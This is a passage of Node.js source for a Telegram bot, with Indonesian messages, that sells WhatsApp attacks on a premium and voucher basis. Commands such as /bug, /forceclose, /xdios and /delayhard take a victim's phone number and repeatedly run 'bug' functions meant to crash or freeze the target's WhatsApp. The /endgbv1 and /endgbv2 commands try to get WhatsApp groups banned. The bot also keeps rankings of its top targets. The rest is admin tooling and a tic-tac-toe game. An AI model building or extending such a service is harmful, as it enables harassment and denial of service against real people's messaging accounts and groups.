  } else if (sub === "list") {
    const list = listVoucher();
    if (!list.length) return ctx.reply("📭 Belum ada voucher.");
    const txt = list.slice(0, 30).map((v, i) => `${i + 1}. <code>${v.code}</code> — ${v.days}h ${v.used ? "USED" : "READY"}`).join("\n");
    ctx.reply(`🎫 <b>VOUCHER</b>\n\n${txt}`, { parse_mode: "HTML" });
  } else ctx.reply("📌 /voucher create|list");
});
bot.command("addcoin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 2) return ctx.reply("📌 /addcoin 12345678 100");
  addCoin(args[0], parseInt(args[1]));
  ctx.reply(`✅ ${args[1]} coin dikirim ke <code>${args[0]}</code>`, { parse_mode: "HTML" });
});

// =====================================================
// ============ INFO TAMBAHAN ==========================
// =====================================================
bot.command("uptime", async (ctx) => {
  const start = moment(botStartTime).tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm:ss");
  ctx.reply(`⏱ <b>UPTIME</b>\n\n🟢 Aktif: <code>${formatUptimePretty()}</code>\n📅 Start: <code>${start} WIB</code>`, { parse_mode: "HTML" });
});
bot.command("sysinfo", async (ctx) => {
  const mem = process.memoryUsage();
  const cpu = process.cpuUsage();
  ctx.reply(`🖥 <b>SYSINFO</b>\n\n💾 RAM: <code>${(mem.rss / 1024 / 1024).toFixed(0)} MB</code>\n🧠 Heap: <code>${(mem.heapUsed / 1024 / 1024).toFixed(0)} MB</code>\n🔧 CPU: <code>${(cpu.user / 1000).toFixed(0)} ms</code>\n📦 Node: <code>${process.version}</code>\n⏱ Uptime: <code>${formatUptimePretty()}</code>`, { parse_mode: "HTML" });
});
bot.command("statscmd", async (ctx) => {
  const stats = getStatCmd().slice(0, 15);
  if (!stats.length) return ctx.reply("📭 Belum ada data.");
  const txt = stats.map((s, i) => `${i + 1}. <code>/${s.c}</code> — ${s.n}x`).join("\n");
  ctx.reply(`📊 <b>STATS CMD</b>\n\n${txt}`, { parse_mode: "HTML" });
});
bot.command("statstarget", async (ctx) => {
  const s = loadStats();
  const top = Object.entries(s.per_target || {}).map(([no, c]) => ({ no, c })).sort((a, b) => b.c - a.c).slice(0, 10);
  if (!top.length) return ctx.reply("📭 Belum ada data.");
  const txt = top.map((t, i) => `${i + 1}. <code>${t.no}</code> — ${t.c}x`).join("\n");
  ctx.reply(`🎯 <b>TOP TARGET</b>\n\n${txt}`, { parse_mode: "HTML" });
});
bot.command("topuser", async (ctx) => {
  const s = loadStats();
  const top = Object.entries(s.per_user || {}).map(([id, v]) => ({ id, ...v }))
    .sort((a, b) => (b.bug_count + b.ban_count) - (a.bug_count + a.ban_count)).slice(0, 10);
  if (!top.length) return ctx.reply("📭 Belum ada data.");
  const txt = top.map((u, i) => `${i + 1}. <b>${esc(u.name || "User")}</b> — 🐛${u.bug_count} 🔥${u.ban_count}`).join("\n");
  ctx.reply(`🏆 <b>TOP USER</b>\n\n${txt}`, { parse_mode: "HTML" });
});
bot.command("topgrup", async (ctx) => {
  const s = loadStats();
  const top = Object.entries(s.per_group || {}).map(([id, c]) => ({ id, c })).sort((a, b) => b.c - a.c).slice(0, 10);
  if (!top.length) return ctx.reply("📭 Belum ada data grup.");
  const txt = top.map((g, i) => `${i + 1}. <code>${g.id}</code> — ${g.c}x`).join("\n");
  ctx.reply(`🏆 <b>TOP GRUP</b>\n\n${txt}`, { parse_mode: "HTML" });
});
bot.command("stats", async (ctx) => {
  const s = loadStats();
  const day = todayWIB();
  const today = s.per_day?.[day] || { bug: 0, ban: 0 };
  const totalIter = (s.total_iterasi_ok || 0) + (s.total_iterasi_fail || 0);
  const rate = totalIter > 0 ? ((s.total_iterasi_ok / totalIter) * 100).toFixed(1) : "0.0";
  ctx.reply(`📊 <b>STATS</b>\n\n🔥 Hari ini (${day})\n🐛 ${today.bug} | 🔥 ${today.ban}\n\n📈 Total\nJob: ${s.total_jobs || 0}\nIter OK: ${s.total_iterasi_ok || 0}\nIter Fail: ${s.total_iterasi_fail || 0}\nRate: ${rate}%`, { parse_mode: "HTML" });
});
bot.command("info", checkWhatsAppConnection, async (ctx) => {
  const html = `
<h1>🛰️ Info Sender</h1>
<hr/>
<table>
  <tr><th>Komponen</th><th>Nilai</th></tr>
  <tr><td>Status WA</td><td><b>${isWhatsAppConnected ? "Online" : "Offline"}</b></td></tr>
  <tr><td>Uptime</td><td><code>${formatRuntime()}</code></td></tr>
  <tr><td>Memory</td><td><code>${formatMemory()}</code></td></tr>
  <tr><td>Node</td><td><code>${process.version}</code></td></tr>
  <tr><td>Nomor</td><td><code>${sock?.user?.id?.split(":")[0] || "-"}</code></td></tr>
</table>
`.trim();
  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html } }); }
  catch { await ctx.reply(`🛰 Status: ${isWhatsAppConnected ? "Online" : "Offline"}\nUptime: ${formatRuntime()}`, { parse_mode: "Markdown" }); }
});
bot.command("topbug", async (ctx) => {
  const s = loadStats();
  const top = Object.entries(s.per_target || {}).map(([no, c]) => ({ no, c })).sort((a, b) => b.c - a.c).slice(0, 10);
  if (!top.length) return ctx.reply("📭 Belum ada data.");
  const rows = top.map((t, i) => `${i + 1}. <code>${esc(t.no)}</code> — ${t.c}x`).join("\n");
  ctx.reply(`🎯 <b>TOP 10 TARGET</b>\n\n${rows}`, { parse_mode: "HTML" });
});

// =====================================================
// ============ BUG COMMAND ============================
// =====================================================
function manualBugCommand(cmd, bugKey, label) {
  bot.command(cmd, premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
    const args = ctx.message.text.split(" ");
    if (!args[1]) return ctx.reply(`📌 Format: /${cmd} 628xxxx`);
    const target = formatTarget(args[1]);
    if (!target) return ctx.reply("❌ Nomor tidak valid.");
    if (isWhitelisted(args[1])) return ctx.reply("🛡 Target ada di whitelist.");
    if (!isPremiumUser(userId)) {
      if (!canUse(userId)) { const u = getUserLimit(userId); return ctx.reply(`⏳ Limit harian habis (${u.used}/${u.max}).`); }
      addUse(userId);
    }
    const tasks = getBugTasks(bugKey, target);
    spamForever(ctx, label, target, tasks);
  });
}
manualBugCommand("delayhard",  "delayhard",  "Delayhard");
manualBugCommand("ghost",      "ghost",      "Ghost");
manualBugCommand("forceclose", "forceclose", "Forceclose");
manualBugCommand("forcezz",    "forcezz",    "Forcezz");
manualBugCommand("xdios",      "xdios",      "Xdios");

function getBugTasks(bugName, target) {
  switch (bugName) {
    case "forceclose":
      return [
        { name: "ForcloseVIDEO", fn: () => ForcloseVIDEO(sock, target) },
        { name: "ForcloseDOC",   fn: () => ForcloseDOC(sock, target)   },
        { name: "ForcloseSTC",   fn: () => ForcloseSTC(sock, target)   },
        { name: "StuckLogo",     fn: () => StuckLogo(sock, target)     },
        { name: "StuckNewAmba",  fn: () => StuckNewAmba(sock, target)  },
      ];
    case "delayhard":
    case "ghost":
      return [
        { name: "StuckLogo",    fn: () => StuckLogo(sock, target)    },
        { name: "StuckNewAmba", fn: () => StuckNewAmba(sock, target) },
      ];
    case "forcezz":
      return [
        { name: "ForcloseVIDEO", fn: () => ForcloseVIDEO(sock, target) },
        { name: "ForcloseDOC",   fn: () => ForcloseDOC(sock, target)   },
        { name: "ForcloseSTC",   fn: () => ForcloseSTC(sock, target)   },
        { name: "StuckLogo",     fn: () => StuckLogo(sock, target)     },
        { name: "StuckNewAmba",  fn: () => StuckNewAmba(sock, target)  },
      ];
    case "xdios":
      return [
        { name: "iosswipper", fn: () => iosswipper(sock, target) },
        { name: "catchingOs", fn: () => catchingOs(target)        },
      ];
    default: return [];
  }
}

bot.command("bug", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Example : /bug 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  if (isWhitelisted(q)) return ctx.reply("🛡 Target ada di whitelist.");
  if (!isPremiumUser(ctx.from.id)) {
    if (!canUse(ctx.from.id)) { const u = getUserLimit(ctx.from.id); return ctx.reply(`⏳ Limit harian habis (${u.used}/${u.max}).`); }
    addUse(ctx.from.id);
  }
  await ctx.replyWithPhoto({ source: "./image/MagicClowerd.jpg" }, {
    caption: `<blockquote><pre>⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡\n⌑ Target : ${q}\n⌑ Status : Ready\n⌑ Silahkan Pilih bug di bawah...\n╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [
      [{ text: "Delay Brutality", callback_data: `delay_${target}` }, { text: "Force Close", callback_data: `fc_${target}` }],
      [{ text: "XDioS", callback_data: `blank_${target}` }, { text: "Force Freez", callback_data: `bulldozer_${target}` }]
    ] }
  });
});

const clickedUsers = {};
bot.on("callback_query", async (ctx) => {
  const userId = ctx.from.id;
  const data = ctx.callbackQuery.data;
  if (!/^(delay|blank|bulldozer|fc)_/.test(data)) return;
  const [key, target] = data.split("_");
  if (clickedUsers[userId]) return ctx.answerCbQuery("⚠️ Kamu udah milih!", { show_alert: true });
  clickedUsers[userId] = true;
  await ctx.answerCbQuery();
  await ctx.deleteMessage().catch(() => {});
  const methods = {
    delay: { name: "Delay Brutality", tasks: [
      { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target) },
      { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)    },
    ]},
    blank: { name: "XDioS", tasks: [
      { name: "catchingOs", fn: () => catchingOs(target) },
      { name: "iosswipper", fn: () => iosswipper(sock, target) },
    ]},
    bulldozer: { name: "Force Freez", tasks: [
      { name: "VIDEO-1", fn: () => ForcloseVIDEO(sock, target) },
      { name: "DOC-1", fn: () => ForcloseDOC(sock, target) },
      { name: "STC-1", fn: () => ForcloseSTC(sock, target) },
    ]},
    fc: { name: "Force close", tasks: [
      { name: "VIDEO-1", fn: () => ForcloseVIDEO(sock, target) },
      { name: "DOC-1", fn: () => ForcloseDOC(sock, target) },
      { name: "STC-1", fn: () => ForcloseSTC(sock, target) },
    ]},
  };
  const m = methods[key];
  if (!m) return;
  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
  spamForever(ctx, m.name, target, m.tasks);
});

bot.command("stopbug", async (ctx) => {
  const userId = ctx.from.id.toString();
  let count = 0;
  for (const [, state] of activeSpam.entries()) {
    if (state.userId === userId) { state.stop = true; count++; }
  }
  if (count === 0) return ctx.reply("📌 Gak ada spam yang jalan.");
  return ctx.reply(`🛑 ${count} spam akan dihentikan...`);
});

// =====================================================
// ============ BAN MANUAL =============================
// =====================================================
function banManual(cmd, banKey, label) {
  bot.command(cmd, premGroupOnly(), async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
    const targetInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!targetInput) return ctx.reply(`📌 Format: /${cmd} https://chat.whatsapp.com/xxxxx`);
    if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid.");
    const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
    try { logStatsBan(userId, ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User"); } catch {}
    await ctx.reply("Succes Banned Group", {
      reply_markup: { inline_keyboard: [[{ text: "Details Target", url: `https://chat.whatsapp.com/${inviteCode}`, style: "success" }]] },
    });
    queue.add(async () => {
      try {
        if (banKey === "endgb") await proxzy(sock, inviteCode);
        else if (banKey === "endgbv2") await BanGroup(sock, inviteCode);
        await ctx.reply(`✅ ${label} selesai!`);
      } catch (e) { await ctx.reply(`❌ Gagal: ${e.message}`); }
    });
  });
}
banManual("endgbv1", "endgb",   "End GB v1");
banManual("endgbv2", "endgbv2", "End GB v2");

// =====================================================
// ============ PAIRING & OWNER TOOLS ==================
// =====================================================
bot.command("addpairing", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Khusus owner.");
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 Format: /addpairing 62×××");
  const phone = args.replace(/[^0-9]/g, "");
  if (!phone) return ctx.reply("❌ Nomor gak valid.");
  try {
    if (!sock) return ctx.reply("❌ Socket belum siap.");
    if (sock.authState.creds.registered) return ctx.reply(`✅ WA udah terhubung ke ${phone}`);
    const code = await sock.requestPairingCode(phone, "1234GINA");
    const formatted = code?.match(/.{1,4}/g)?.join("-") || code;
    const caption = `<blockquote><pre>
⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Number       : ${phone}
⌑ Pairing Code : ${formatted}
╘═——————————————═⬡
</pre></blockquote>`.trim();
    const sent = await ctx.replyWithPhoto(ThumbnailPairing, {
      caption, parse_mode: "HTML",
      reply_markup: { inline_keyboard: [[{ text: "SALIN CODE", copy_text: { text: formatted } }]] },
    });
    lastPairingMessage = { chatId: ctx.chat.id, messageId: sent.message_id, phoneNumber: phone, pairingCode: formatted };
  } catch (err) { console.error("addpairing err:", err.message); }
});

bot.command("setcd", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Khusus owner.");
  const s = parseInt(ctx.message.text.split(" ")[1]);
  if (isNaN(s) || s < 0) return ctx.reply("🪧 Format: /setcd 5");
  cooldown = s; saveCooldown(s);
  ctx.reply(`✅ Cooldown ${s} detik.`);
});

bot.command("killsession", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Khusus owner.");
  try {
    let deleted = false;
    for (const dir of ["./session", "./sessions"]) {
      if (fs.existsSync(dir)) { fs.rmSync(dir, { recursive: true, force: true }); deleted = true; }
    }
    if (deleted) { await ctx.reply("✅ Session dihapus, restart..."); setTimeout(() => process.exit(1), 2000); }
    else ctx.reply("🪧 Gak ada folder session.");
  } catch (err) { ctx.reply("❌ Gagal hapus session."); }
});

bot.command("addprem", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Khusus owner.");
  const args = ctx.message.text.split(" ");
  let userId = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id.toString() : args[1];
  if (!userId || (!ctx.message.reply_to_message && args.length < 3)) return ctx.reply("🪧 /addprem 12345678 30");
  const dIdx = ctx.message.reply_to_message ? 1 : 2;
  const duration = parseInt(args[dIdx]);
  if (isNaN(duration)) return ctx.reply("🪧 Durasi harus angka.");
  const exp = addPremUser(userId, duration);
  ctx.reply(`✅ ${userId} premium sampai ${exp}`);
});

bot.command("delprem", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Khusus owner.");
  const args = ctx.message.text.split(" ");
  const userId = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id.toString() : args[1];
  if (!userId) return ctx.reply("🪧 /delprem 12345678");
  removePremUser(userId);
  ctx.reply(`✅ ${userId} dihapus dari premium.`);
});

// =====================================================
// ============ APPROVED GROUP =========================
// =====================================================
bot.command("approved", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const chatId = ctx.message.text.split(" ").slice(1)[0];
  if (!chatId) return ctx.reply("🪧 /approved -100xxxxxxxxxx");
  if (isGroupApproved(chatId)) return ctx.reply("⚠️ Udah di-approve.");
  approvedGroups.push(String(chatId)); saveApproved();
  if (pendingGroups.has(String(chatId))) { clearTimeout(pendingGroups.get(String(chatId)).timeout); pendingGroups.delete(String(chatId)); }
  try { await ctx.telegram.sendMessage(chatId, "✅ Grup ini sudah di-approve owner."); } catch {}
  ctx.reply(`✅ Grup ${chatId} di-approve.`);
});
bot.command("unapproved", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const chatId = ctx.message.text.split(" ").slice(1)[0];
  if (!chatId) return ctx.reply("🪧 /unapproved -100xxxxxxxxxx");
  if (!isGroupApproved(chatId)) return ctx.reply("⚠️ Belum di-approve.");
  approvedGroups = approvedGroups.filter((x) => x !== String(chatId)); saveApproved();
  try { await ctx.telegram.sendMessage(chatId, "⚠️ Approval dicabut."); } catch {}
  ctx.reply(`✅ Approval grup ${chatId} dicabut.`);
});
bot.command("listapprovedgroup", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  if (!approvedGroups.length) return ctx.reply("📭 Belum ada grup approved.");
  ctx.reply(`📋 Grup approved:\n\n${approvedGroups.map((id, i) => `${i + 1}. ${id}`).join("\n")}`);
});

// =====================================================
// ============ BLOCK COMMAND ==========================
// =====================================================
bot.command("blockcmd", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const cmd = normCmd(ctx.message.text.split(" ").slice(1)[0]);
  if (!cmd) return ctx.reply("🪧 /blockcmd namacommand");
  if (["blockcmd", "unblockcmd", "listblockcmd"].includes(cmd)) return ctx.reply("❌ Gak bisa diblokir.");
  if (blockedCommands.includes(cmd)) return ctx.reply(`⚠️ /${cmd} udah diblokir.`);
  blockedCommands.push(cmd); saveBlocked();
  ctx.reply(`✅ /${cmd} diblokir.`);
});
bot.command("unblockcmd", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const cmd = normCmd(ctx.message.text.split(" ").slice(1)[0]);
  if (!cmd) return ctx.reply("🪧 /unblockcmd namacommand");
  if (!blockedCommands.includes(cmd)) return ctx.reply(`⚠️ /${cmd} gak diblokir.`);
  blockedCommands = blockedCommands.filter((x) => x !== cmd); saveBlocked();
  ctx.reply(`✅ /${cmd} dibuka.`);
});
bot.command("listblockcmd", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  if (!blockedCommands.length) return ctx.reply("✅ Gak ada command diblokir.");
  ctx.reply(`📋 Diblokir:\n\n${blockedCommands.map((c, i) => `${i + 1}. /${c}`).join("\n")}`);
});

// =====================================================
// ============ PREMIUM GROUP CMD ======================
// =====================================================
bot.command("addpremgrup", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  if (ctx.chat?.type === "private") return ctx.reply("❌ Pakai di grup.");
  addPremGroup(ctx.chat.id);
  ctx.reply(`✅ <b>${esc(ctx.chat?.title || "Grup")}</b> masuk daftar premium.`, { parse_mode: "HTML" });
});
bot.command("delpremgrup", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  if (ctx.chat?.type === "private") return ctx.reply("❌ Pakai di grup.");
  delPremGroup(ctx.chat.id);
  ctx.reply(`🗑 <b>${esc(ctx.chat?.title || "Grup")}</b> dihapus.`, { parse_mode: "HTML" });
});
bot.command("listpremgrup", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const d = loadPrem();
  if (!d.groups.length) return ctx.reply("📭 Belum ada grup premium.");
  ctx.reply(`📌 <b>GRUP PREMIUM</b>\n\n${d.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n")}`, { parse_mode: "HTML" });
});

// =====================================================
// ============ TEXT HANDLER (PENDING GROUP) ===========
// =====================================================
bot.on("text", async (ctx, next) => {
  const userId = ctx.from.id;
  const text = ctx.message?.text || "";

  // PENDING GROUP ASK
  if (pendingGroupAsk.has(userId)) {
    if (text.startsWith("/")) { pendingGroupAsk.delete(userId); return next(); }
    const action = pendingGroupAsk.get(userId);
    pendingGroupAsk.delete(userId);
    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
    const groupJid = await resolveWaGroup(text.trim());
    if (!groupJid) return ctx.reply("❌ Link/ID grup gak valid.");
    const meta = await fetchGroupInfo(groupJid);
    if (!meta) return ctx.reply("❌ Gagal ambil info grup.");
    try {
      if (action === "info") {
        try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: groupInfoHtml(meta) } }); }
        catch { await ctx.reply(`👥 ${esc(meta.subject)} — ${meta.participants.length} member`, { parse_mode: "Markdown" }); }
      } else if (action === "admin") {
        try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: adminListHtml(meta) } }); }
        catch { await ctx.reply(`👑 Admin: ${meta.participants.filter(p=>p.admin).length}`, { parse_mode: "Markdown" }); }
      } else if (action === "member") {
        try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: memberListHtml(meta) } }); }
        catch { await ctx.reply(`👥 Member: ${meta.participants.length}`, { parse_mode: "Markdown" }); }
      } else if (action === "lock") {
        await sock.groupSettingsUpdate(groupJid, "announcement", true);
        await ctx.reply("🔒 Grup di-lock.");
      } else if (action === "unlock") {
        await sock.groupSettingsUpdate(groupJid, "announcement", false);
        await ctx.reply("🔓 Grup di-unlock.");
      } else if (action === "invite") {
        const code = await sock.groupInviteCode(groupJid);
        await ctx.reply(`🔗 *INVITE LINK*\n\nhttps://chat.whatsapp.com/${code}`, { parse_mode: "Markdown" });
      }
    } catch (e) { await ctx.reply(`❌ ${e.message}`); }
    return;
  }

  // PENDING BAN
  if (pendingBanUser.has(userId)) {
    if (text.startsWith("/")) { pendingBanUser.delete(userId); return next(); }
    const targetInput = text.trim();
    if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid.");
    const banName = pendingBanUser.get(userId);
    pendingBanUser.delete(userId);
    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
    const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
    try { logStatsBan(userId, ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User"); } catch {}
    await ctx.reply("Succes Banned Group", {
      reply_markup: { inline_keyboard: [[{ text: "Details Target", url: `https://chat.whatsapp.com/${inviteCode}`, style: "success" }]] },
    });
    queue.add(async () => {
      try {
        if (banName === "endgb") await proxzy(sock, inviteCode);
        else if (banName === "endgbv2") await BanGroup(sock, inviteCode);
        await ctx.reply("✅ Ban group selesai!");
      } catch (e) { await ctx.reply(`❌ Gagal: ${e.message}`); }
    });
    return;
  }

  // PENDING BUG
  if (!pendingBugUser.has(userId)) return next();
  if (text.startsWith("/")) { pendingBugUser.delete(userId); return next(); }
  const parts = text.trim().split(/\s+/);
  if (parts.length !== 1) return next();
  const rawNumber = parts[0];
  const target = formatTarget(rawNumber);
  if (!target) return ctx.reply("❌ Nomor gak valid.");
  const bugName = pendingBugUser.get(userId);
  pendingBugUser.delete(userId);
  const label = { forceclose: "Forceclose", delayhard: "Delayhard", ghost: "Ghost", forcezz: "Forcezz", xdios: "Xdios" }[bugName] || bugName;
  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
  if (isWhitelisted(rawNumber)) return ctx.reply("🛡 Target ada di whitelist.");
  if (!isPremiumUser(userId)) {
    if (!canUse(userId)) { const u = getUserLimit(userId); return ctx.reply(`⏳ Limit habis (${u.used}/${u.max}).`); }
    addUse(userId);
  }
  const tasks = getBugTasks(bugName, target);
  if (!tasks.length) return ctx.reply("❌ Bug tidak dikenal.");
  spamForever(ctx, label, target, tasks);
});

// =====================================================
// ============ AUTO RESET LIMIT =======================
// =====================================================
setInterval(() => {
  const now = moment().tz("Asia/Jakarta");
  if (now.format("HH:mm:ss") === "00:00:00") {
    resetAllLimit();
    console.log("[AUTO] Limit di-reset.");
  }
}, 1000);

// =====================================================
// ============ NOTIF PREMIUM HAMPIR HABIS =============
// =====================================================
setInterval(async () => {
  try {
    const users = getAllUsers();
    for (const u of Object.values(users)) {
      if (isPremiumUser(u.id) && sisaHariPremium(u.id) === 1) {
        bot.telegram.sendMessage(u.id, `⚠️ <b>PREMIUM HAMPIR HABIS</b>\n\nSisa 1 hari lagi. Segera perpanjang!`, { parse_mode: "HTML" }).catch(() => {});
      }
    }
  } catch {}
}, 12 * 60 * 60 * 1000);

// =====================================================
// ============ AUTO BACKUP SAAT BOOT ==================
// =====================================================
if (autobackupEnabled) {
  autobackupInterval = setInterval(async () => {
    try {
      const files = fs.readdirSync("./database").filter(f => f.endsWith(".json"));
      for (const f of files) await bot.telegram.sendDocument(ownerID, { source: `./database/${f}`, filename: f }).catch(() => {});
      await bot.telegram.sendMessage(ownerID, `📦 Autobackup: ${files.length} file`);
    } catch {}
  }, 6 * 60 * 60 * 1000);
}

// =====================================================
// ============ DETEKSI BOT JOIN GRUP ==================
// =====================================================
bot.on("my_chat_member", async (ctx) => {
  try {
    const u = ctx.update.my_chat_member;
    const nw = u.new_chat_member.status;
    const old = u.old_chat_member.status;
    const chat = u.chat;
    if (chat.type !== "group" && chat.type !== "supergroup") return;
    const chatId = String(chat.id);
    const title = chat.title || "Tanpa Nama";
    if (["member", "administrator"].includes(nw) && ["left", "kicked"].includes(old)) {
      if (isGroupApproved(chatId)) return;
      await ctx.telegram.sendMessage(chat.id, "⚠️ Bot belum di-approve owner. Jika 10 menit gak di-approve, bot keluar otomatis.");
      await ctx.telegram.sendMessage(ownerID, `🚨 BOT DITAMBAHKAN KE GRUP BARU\n\nNama : ${title}\nID   : ${chatId}\n\nGunakan:\n/approved ${chatId}`);
      if (pendingGroups.has(chatId)) clearTimeout(pendingGroups.get(chatId).timeout);
      const t = setTimeout(async () => {
        try {
          if (!isGroupApproved(chatId)) {
            await ctx.telegram.sendMessage(chat.id, "❌ Tidak di-approve 10 menit. Bot keluar.");
            await ctx.telegram.leaveChat(chat.id);
          }
        } catch {}
        finally { pendingGroups.delete(chatId); }
      }, 10 * 60 * 1000);
      pendingGroups.set(chatId, { title, timeout: t });
    }
  } catch (err) { console.error("my_chat_member err:", err.message); }
});

// =====================================================
// ============ MIDDLEWARE GROUP =======================
// =====================================================
bot.use(async (ctx, next) => {
  if (!ctx.chat) return next();
  const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
  if (!isGroup) return next();
  const chatId = String(ctx.chat.id);
  const text = ctx.message?.text || "";
  const cmd = text.startsWith("/") ? text.split(" ")[0].toLowerCase() : "";
  const bypass = ["/approved", "/unapproved", "/listapprovedgroup"];
  if (!isGroupApproved(chatId) && !bypass.includes(cmd)) {
    if (ctx.message?.text?.startsWith("/")) {
      await ctx.reply("❌ Grup ini belum di-approve owner.\n🪧 Format: /approved -100xxxxxxxxxx");
    }
    return;
  }
  return next();
});

// =====================================================
// ============ MIDDLEWARE BLOCK CMD ===================
// =====================================================
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next();
  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) return next();
  const cmd = normCmd(text.split(" ")[0].split("@")[0]);
  const bypass = ["blockcmd", "unblockcmd", "listblockcmd"];
  if (!bypass.includes(cmd) && isBlocked(cmd)) {
    await ctx.reply(`❌ Command /${cmd} sedang diblokir.`);
    return;
  }
  return next();
});

// =====================================================
// ============ TIC TAC TOE ============================
// =====================================================
const tttGames = new Map();
function tttWinner(b) {
  const L = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  for (const [a, b1, c] of L) if (b[a] && b[a] === b[b1] && b[a] === b[c]) return b[a];
  return null;
}
const tttDraw = (b) => b.every((v) => v) && !tttWinner(b);
const tttCell = (v) => (v === "X" ? "❌" : v === "O" ? "⭕" : "➖");
const tttName = (u) => (u?.username ? `@${u.username}` : u?.first_name || "User");
const tttKbd = (chatId, gid, b, lock = false) => {
  const btn = (i) => ({ text: tttCell(b[i]), callback_data: lock ? `tttnoop_${chatId}_${gid}` : `tttmove_${chatId}_${gid}_${i}` });
  return { inline_keyboard: [[btn(0), btn(1), btn(2)], [btn(3), btn(4), btn(5)], [btn(6), btn(7), btn(8)]] };
};
bot.command("ttt", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) return ctx.reply("❌ Cuma bisa di grup.");
  const chatId = ctx.chat.id;
  if (tttGames.has(chatId)) return ctx.reply("⚠️ Masih ada game.");
  const gid = Date.now().toString().slice(-6);
  tttGames.set(chatId, { id: gid, board: Array(9).fill(null), players: { X: ctx.from, O: null }, turn: "X", started: false });
  await ctx.reply(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(ctx.from)}</b>\n⭕ O : <b>Belum join</b>`, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{ text: "Join Game", callback_data: `tttjoin_${chatId}_${gid}` }]] },
  });
});
bot.command("tttstop", async (ctx) => {
  if (!tttGames.has(ctx.chat.id)) return ctx.reply("❌ Gak ada game.");
  tttGames.delete(ctx.chat.id);
  ctx.reply("🛑 Game dihentikan.");
});
bot.command("mypoint", async (ctx) => {
  const row = getPoint(ctx.from.id);
  if (!row) return ctx.reply("📌 Belum punya point.");
  ctx.reply(`🏅 <b>POINT</b>\n\n⭐ ${row.points}\n🏆 ${row.win} | 🤝 ${row.draw} | 💀 ${row.lose}`, { parse_mode: "HTML" });
});
bot.command("leaderboard", async (ctx) => {
  const top = getTop(10);
  if (!top.length) return ctx.reply("📌 Kosong.");
  ctx.reply(`🏆 <b>LEADERBOARD</b>\n\n${top.map((u, i) => `${i + 1}. <b>${u.name}</b> — ⭐ ${u.points}`).join("\n")}`, { parse_mode: "HTML" });
});
bot.action(/^tttjoin_(.+)_(.+)$/, async (ctx) => {
  try {
